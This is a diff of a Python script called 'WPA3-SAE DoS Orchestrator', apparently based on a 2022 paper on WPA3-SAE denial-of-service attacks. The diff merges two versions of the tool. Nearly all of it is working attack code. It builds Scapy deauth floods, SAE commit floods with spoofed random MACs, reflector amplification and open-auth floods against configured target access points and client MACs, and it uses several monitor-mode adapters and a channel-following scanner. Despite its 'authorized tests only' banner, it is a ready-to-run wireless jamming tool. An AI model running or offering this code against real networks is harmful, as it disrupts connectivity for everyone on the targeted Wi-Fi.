@@ -1,18 +1,16 @@
 #!/usr/bin/env python3
 """
 ================================================================================
-WPA3-SAE DoS Orchestrator (Scientific Research Edition) - ENHANCED
+WPA3-SAE DoS Orchestrator (Scientific Research Edition) - VERSION 1 + SCANNER V2
 ================================================================================
 Based on: "How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"
 Journal of Information Security and Applications 64 (2022) 103058
 FOR EDUCATIONAL PURPOSES AND AUTHORIZED SECURITY TESTS ONLY!
 ================================================================================
-SCIENTIFIC ENHANCEMENTS:
-- Removed radio_confusion (vendor-specific, not required for generic SAE DoS)
-- IEEE 802.11-2020 §12.4.4.2 compliant SAE payload construction
-- Precise burst timing (128 frames, 100μs inter-packet gap per paper)
-- Scientific logging with ISO timestamps & reproducible experiment markers
-- Strict SAE parameter validation & anti-clogging threshold alignment
+COMBINED ENHANCEMENTS:
+- Original attack logic from Version 1 (paper-accurate Cookie Guzzler etc.)
+- Improved scanner logic from Version 2 (robust channel detection)
+- Minor import/stability fixes from Version 2
 ================================================================================
 """
 import subprocess
@@ -39,21 +37,18 @@ logger = logging.getLogger("WPA3-SAE-Orchestrator")
 # =====================================================================================
 # ======================== SCIENTIFIC CONSTANTS (PAPER ALIGNMENT) =====================
 # =====================================================================================
-# Anti-Clogging & State Management (Table 2, Paper Section 2.2 & 3.2)
 ANTI_CLOGGING_THRESHOLD = 5        # dot11RSNASAEAntiCloggingThreshold (default)
 RETRANS_PERIOD_MS = 40             # dot11RSNASAERetransPeriod (40ms)
 SAE_SYNC = 5                       # dot11RSNASAESync (max retransmissions)
 AP_MAX_INACTIVITY = 300            # AP_MAX_INACTIVITY timeout (seconds)
 
-# Burst & Timing Parameters (Paper Section 3.3, Page 5)
 BURST_SIZE = 128                   # Standard burst size for reproducible DoS
 INTER_PACKET_GAP = 0.0001          # 100μs inter-packet delay (burst mode)
 PACKETS_PER_SECOND_LIMIT = 1000    # Ethical rate limit for controlled experiments
 
-# SAE Payload Structure (IEEE 802.11-2020 §12.4.4.2)
 SAE_GROUP_ID_19 = b'\x13\x00'      # ECC P-256 (mandatory group)
-SCALAR_BYTES = 32                  # 256-bit scalar
-FINITE_BYTES = 64                  # 512-bit finite field element
+SCALAR_BYTES = 32
+FINITE_BYTES = 64
 
 # =====================================================================================
 # ======================== CENTRAL CONFIGURATION ======================================
@@ -83,13 +78,13 @@ SAE_FINITE_5_HEX_LIST = [
 ]
 
 # --- 3. OPTIONAL SCANNER ---
-SCANNER_INTERFACE = ""
+SCANNER_INTERFACE = ""              # Leave empty to disable scanner
 SCANNER_INTERVAL = 30
 SCANNER_DURATION = 10
 
 # --- 4. MANUAL CHANNEL ASSIGNMENT ---
-MANUELLER_KANAL_5GHZ = "36"
-MANUELLER_KANAL_2_4GHZ = "11"
+MANUELLER_KANAL_5GHZ = "104"
+MANUELLER_KANAL_2_4GHZ = "6"
 
 # --- 5. TARGET CLIENTS ---
 TARGET_STA_MACS = [
@@ -177,11 +172,15 @@ AMPLIFICATION_REFLECTOR_APS_2_4GHZ =[
 # ==============================================================================================
 # ======================== ADAPTER CONFIGURATION ======================================
 ADAPTER_KONFIGURATION = {
-    "wlan0mon": {"band": "2.4GHz", "angriff": "amplification"},
-    "wlan1mon": {"band": "5GHz", "angriff": "cookie_guzzler"}
+    # --- 5 GHz Band ---
+     "wlan3mon": {"band": "5GHz", "angriff": "cookie_guzzler"},
+     "wlan5mon": {"band": "5GHz", "angriff": "double_decker"},        
+    # --- 2.4 GHz Band ---
+#    "wlan7mon": {"band": "2.4GHz", "angriff": "cookie_guzzler"}
+    # add more adapters as needed
 }
 
-# ======================== SHARED MEMORY FOR SCANNER =================================
+# ======================== SHARED MEMORY FOR SCANNER ==================
 shared_channels = Manager().dict({'2.4GHz': MANUELLER_KANAL_2_4GHZ, '5GHz': MANUELLER_KANAL_5GHZ})
 channel_lock = Lock()
 
@@ -197,13 +196,13 @@ def validate_sae_hex_lists():
             return False
         logger.info(f"[VALIDATION] {name}: {len(valid)} valid entries loaded.")
         return True
-    
+
     ok = True
     ok &= check_list(SAE_SCALAR_2_4_HEX_LIST, "SAE_SCALAR_2_4", 64)
     ok &= check_list(SAE_FINITE_2_4_HEX_LIST, "SAE_FINITE_2_4", 128)
     ok &= check_list(SAE_SCALAR_5_HEX_LIST, "SAE_SCALAR_5", 64)
     ok &= check_list(SAE_FINITE_5_HEX_LIST, "SAE_FINITE_5", 128)
-    
+
     if not ok:
         logger.critical("[VALIDATION] SAE parameters invalid. Attack will fail.")
         sys.exit(1)
@@ -216,17 +215,18 @@ def set_channel_scientific(interface: str, channel: str) -> bool:
             if subprocess.run(cmd, capture_output=True, timeout=2).returncode == 0:
                 time.sleep(0.15)  # Hardware settle time per Linux wireless docs
                 return True
-        except Exception: pass
+        except Exception:
+            pass
     logger.warning(f"[CHANNEL] Failed to set channel {channel} on {interface}")
     return False
 
 def send_burst_scientific(packet_list: list, interface: str, counter: Value):
     """Paper-aligned burst sending with precise timing & atomic counting"""
-    if not packet_list: return
-    
-    # FIX: Explicit import outside try-block to prevent 'name sendp is not defined'
-    from scapy.all import sendp
-    
+    if not packet_list:
+        return
+
+    from scapy.all import sendp  # explicit early import (stability fix)
+
     start = time.time()
     sent = 0
     batch = packet_list[:BURST_SIZE]  # Always send in paper-defined chunks
@@ -245,13 +245,15 @@ def send_burst_scientific(packet_list: list, interface: str, counter: Value):
         time.sleep(0.1)
 
 # =====================================================================================
-# ======================== SCANNER FUNCTIONS ==========================================
+# ======================== SCANNER FUNCTIONS (VERSION 2 IMPROVED) =====================
 # =====================================================================================
 def parse_airodump_csv(csv_file):
+    """Robust parsing with band channel range checks (from Version 2)"""
     results = {}
     try:
         with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
             content = f.read()
+        # Separate AP block (before first empty line)
         ap_block = content.split('\n\n')[0]
         lines = ap_block.strip().split('\n')
         for line in lines:
@@ -261,7 +263,8 @@ def parse_airodump_csv(csv_file):
             if len(parts) >= 14:
                 bssid = parts[0].upper()
                 channel = parts[3].strip()
-                if not channel.isdigit(): continue
+                if not channel.isdigit():
+                    continue
                 channel_int = int(channel)
                 if bssid == TARGET_BSSID_2_4GHZ.upper() and 1 <= channel_int <= 14:
                     results['2.4GHz'] = channel
@@ -272,11 +275,14 @@ def parse_airodump_csv(csv_file):
     return results
 
 def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
-    if not scanner_iface: return
+    if not scanner_iface:
+        return
     logger.info(f"[SCANNER] Starting on {scanner_iface} (Interval: {interval}s, Scan: {scan_duration}s)")
     for f in glob.glob("/tmp/scan_*"):
-        try: os.remove(f)
-        except: pass
+        try:
+            os.remove(f)
+        except Exception:
+            pass
     while True:
         try:
             timestamp = int(time.time())
@@ -299,33 +305,36 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
                             if old != new:
                                 shared_dict[band] = new
                                 logger.info(f"[SCANNER] {band}: Channel {old} → {new}")
-                for f in glob.glob(f"{prefix}*"):
-                    try: os.remove(f)
-                    except: pass
-                time.sleep(max(0, interval - scan_duration))
-        except KeyboardInterrupt: break
+            for f in glob.glob(f"{prefix}*"):
+                try:
+                    os.remove(f)
+                except Exception:
+                    pass
+            time.sleep(max(0, interval - scan_duration))
+        except KeyboardInterrupt:
+            break
         except Exception as e:
             logger.error(f"[SCANNER ERROR] {e}")
             time.sleep(5)
 
 # =====================================================================================
-# ======================== ATTACK FUNCTIONS ===========================================
+# ======================== ATTACK FUNCTIONS (VERSION 1 LOGIC) =========================
 # =====================================================================================
 def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list,
                          counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
-    """Scientific attack implementation with list-based SAE rotation"""
-    # FIX: Import Raw and sendp explicitly for packet construction
-    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp, Raw
-    
+    """Scientific attack implementation – original Version 1 behavior"""
+    from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
+
     if not set_channel_scientific(interface, channel):
         logger.error(f"[ATTACK] {interface}: Channel setup failed")
         return
-        
+
     # Decode & validate SAE lists
     try:
         s_bytes = [bytes.fromhex(s.strip()) for s in scalar_hex_list if "INSERT" not in s and len(s.strip()) == 64]
         f_bytes = [bytes.fromhex(f.strip()) for f in finite_hex_list if "INSERT" not in f and len(f.strip()) == 128]
-        if not s_bytes or not f_bytes: raise ValueError("Invalid SAE lists")
+        if not s_bytes or not f_bytes:
+            raise ValueError("Invalid SAE lists")
     except Exception as e:
         logger.error(f"[ATTACK] {interface}: SAE decode failed: {e}")
         return
@@ -334,12 +343,10 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
         idx = random.randint(0, min(len(s_bytes), len(f_bytes)) - 1)
         return s_bytes[idx], f_bytes[idx]
 
-    # FIX: Correct Single Raw Payload Construction (IEEE 802.11-2020 §12.4.4.2)
     def make_sae_commit(mac, seq=1):
         scalar, finite = get_random_sae()
-        sae_payload = SAE_GROUP_ID_19 + scalar + finite
         return RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=mac, addr3=bssid)/\
-               Dot11Auth(algo=3, seqnum=seq, status=0)/Raw(sae_payload)
+               Dot11Auth(algo=3, seqnum=seq, status=0)/SAE_GROUP_ID_19/scalar/finite
 
     logger.info(f"[ATTACK] {interface} on CH {channel} -> {attack_type}")
     burst_count = 0
@@ -347,79 +354,73 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
         while True:
             packets = []
             t_start = time.time()
-            
+
             if attack_type == "deauth_flood":
                 targets = (sta_macs or []) + ["ff:ff:ff:ff:ff:ff"]
                 for sta in targets:
                     p1 = RadioTap()/Dot11(addr1=sta, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
                     p2 = RadioTap()/Dot11(addr1=bssid, addr2=sta, addr3=bssid)/Dot11Deauth(reason=7)
                     packets.extend([p1, p2])
-                packets *= 5  # Scale to ~burst_size equivalent
-                
+                packets *= 5
+
             elif attack_type == "omnivore":
-                # Section 4.4: Memory exhaustion via unique MACs < threshold
                 macs = [str(RandMAC()) for _ in range(ANTI_CLOGGING_THRESHOLD - 1)]
                 for m in macs:
                     packets.append(make_sae_commit(m))
-                packets *= 20  # Sustained pressure
-                
+                packets *= 20
+
             elif attack_type == "muted":
-                # Section 4.2.1: Single MAC, list rotation
                 mac = sta_macs[0] if sta_macs else "00:11:22:33:44:55"
                 packets = [make_sae_commit(mac) for _ in range(BURST_SIZE)]
-                
+
             elif attack_type == "hasty":
-                # Section 4.2.2: Commit + Confirm confusion
                 for _ in range(BURST_SIZE // 2):
                     m = str(RandMAC())
                     packets.append(make_sae_commit(m, seq=1))
                     packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=m, addr3=bssid)/\
                                    Dot11Auth(algo=3, seqnum=2, status=0)/b'\x00\x00'/bytes([random.randint(0,255) for _ in range(32)]))
-                                   
+
             elif attack_type == "double_decker":
-                # Section 4.5: Pre + Post anti-clogging stress
                 for _ in range(BURST_SIZE // 2):
                     packets.append(make_sae_commit(str(RandMAC())))
                 if sta_macs:
                     packets.extend([make_sae_commit(sta_macs[0]) for _ in range(BURST_SIZE // 2)])
-                    
+
             elif attack_type == "cookie_guzzler":
-                # Section 4.2.1: Exploit retransmission flaw
-                # FIX: NEW MAC for every single packet to bypass MAC-filtering and fill RAM
-                for _ in range(BURST_SIZE):
-                    packets.append(make_sae_commit(str(RandMAC())))
-                    
+                # Original paper behavior: single random MAC for the whole burst
+                mac = str(RandMAC())
+                packets = [make_sae_commit(mac) for _ in range(BURST_SIZE)]
+
             elif attack_type == "amplification":
                 if amplification_targets and len(amplification_targets) >= 2:
                     src, dst = random.sample(amplification_targets, 2)
                     scalar, finite = get_random_sae()
-                    sae_payload = SAE_GROUP_ID_19 + scalar + finite
                     p = RadioTap()/Dot11(type=0, subtype=11, addr1=dst, addr2=src, addr3=dst)/\
-                        Dot11Auth(algo=3, seqnum=1, status=0)/Raw(sae_payload)
+                        Dot11Auth(algo=3, seqnum=1, status=0)/SAE_GROUP_ID_19/scalar/finite
                     packets = [p] * BURST_SIZE
-                    
+
             elif attack_type == "open_auth":
-                # Section 4.7: Legacy open auth flooding
                 for _ in range(BURST_SIZE):
                     packets.append(RadioTap()/Dot11(type=0, subtype=11, addr1=bssid, addr2=str(RandMAC()), addr3=bssid)/\
                                    Dot11Auth(algo=0, seqnum=1, status=0))
-                                   
+
             elif attack_type == "back_to_the_future":
-                # Section 6.7: WPA2 memory poisoning with WPA3 frames
                 for _ in range(BURST_SIZE):
                     packets.append(make_sae_commit(str(RandMAC())))
+
             else:
                 logger.warning(f"[ATTACK] Unknown type: {attack_type}. Falling back to generic.")
-                for _ in range(BURST_SIZE):
-                    packets.append(make_sae_commit(str(RandMAC())))
+                packets = [make_sae_commit(str(RandMAC())) for _ in range(BURST_SIZE)]
 
             if packets:
                 send_burst_scientific(packets, interface, counter)
                 burst_count += 1
                 dt = time.time() - t_start
                 logger.info(f"[BURST] {interface} | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
-                # Scientific sleep to maintain target rate & avoid driver starvation
-                time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
+
+            # Scientific sleep to maintain target rate & avoid driver starvation
+            time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
+
     except KeyboardInterrupt:
         logger.info(f"[STOP] {interface} interrupted by user")
     except Exception as e:
@@ -432,11 +433,14 @@ def cleanup(procs, scanner_proc=None):
     logger.info("[CLEANUP] Terminating processes...")
     for iface, p in procs.items():
         if p and p.is_alive():
-            p.terminate(); p.join(timeout=1)
-            if p.is_alive(): p.kill()
-        logger.info(f"[CLEANUP] {iface} terminated")
+            p.terminate()
+            p.join(timeout=1)
+            if p.is_alive():
+                p.kill()
+            logger.info(f"[CLEANUP] {iface} terminated")
     if scanner_proc and scanner_proc.is_alive():
-        scanner_proc.terminate(); scanner_proc.join(timeout=1)
+        scanner_proc.terminate()
+        scanner_proc.join(timeout=1)
         logger.info("[CLEANUP] Scanner terminated")
 
 def signal_handler(sig, frame):
@@ -450,16 +454,16 @@ def main():
     if os.geteuid() != 0:
         logger.critical("[ERROR] Must run as root: sudo python3 ...")
         sys.exit(1)
-        
+
     logger.info("="*70)
-    logger.info("WPA3-SAE DoS Orchestrator (Scientific Edition)")
+    logger.info("WPA3-SAE DoS Orchestrator (Paper-accurate V1 + Scanner V2)")
     logger.info("Based on: JISA 64 (2022) 103058")
     logger.info("="*70)
-    
+
     validate_sae_hex_lists()
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
-    
+
     scanner_proc = None
     if SCANNER_INTERFACE:
         scanner_proc = Process(target=scanner_process,
@@ -467,7 +471,7 @@ def main():
                                      shared_channels, channel_lock), daemon=True)
         scanner_proc.start()
         time.sleep(2)
-        
+
     procs, counters, active_ch = {}, {i: Value('L', 0) for i in ADAPTER_KONFIGURATION}, {}
     try:
         while True:
@@ -475,30 +479,37 @@ def main():
                 band, attack = cfg['band'], cfg['angriff']
                 with channel_lock:
                     ch = shared_channels.get(band)
-                    if not ch: ch = MANUELLER_KANAL_5GHZ if band == '5GHz' else MANUELLER_KANAL_2_4GHZ
-                    
+                    if not ch:
+                        ch = MANUELLER_KANAL_5GHZ if band == '5GHz' else MANUELLER_KANAL_2_4GHZ
+
                 restart = False
-                if iface not in procs or not procs[iface].is_alive(): restart = True
-                elif active_ch.get(iface) != ch: restart = True
-                
+                if iface not in procs or not procs[iface].is_alive():
+                    restart = True
+                elif active_ch.get(iface) != ch:
+                    restart = True
+
                 if restart:
                     if iface in procs and procs[iface].is_alive():
-                        procs[iface].terminate(); procs[iface].join(timeout=0.5)
-                        if procs[iface].is_alive(): procs[iface].kill()
-                        
+                        procs[iface].terminate()
+                        procs[iface].join(timeout=0.5)
+                        if procs[iface].is_alive():
+                            procs[iface].kill()
+
                     s_hex = SAE_SCALAR_5_HEX_LIST if band == '5GHz' else SAE_SCALAR_2_4_HEX_LIST
                     f_hex = SAE_FINITE_5_HEX_LIST if band == '5GHz' else SAE_FINITE_2_4_HEX_LIST
                     target_b = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                     refl = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
-                    
+
                     p = Process(target=run_attacker_process,
                                 args=(iface, target_b, ch, attack, s_hex, f_hex, counters[iface]),
                                 kwargs={'sta_macs': TARGET_STA_MACS,
                                         'amplification_targets': refl,
                                         'opposite_bssid': None}, daemon=True)
-                    procs[iface] = p; active_ch[iface] = ch; p.start()
+                    procs[iface] = p
+                    active_ch[iface] = ch
+                    p.start()
                     logger.info(f"[ORCHESTRATOR] {iface} -> {attack} on CH {ch}")
-                    
+
             time.sleep(1)
     except KeyboardInterrupt:
         logger.info("[STOP] Keyboard interrupt")
@@ -508,4 +519,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
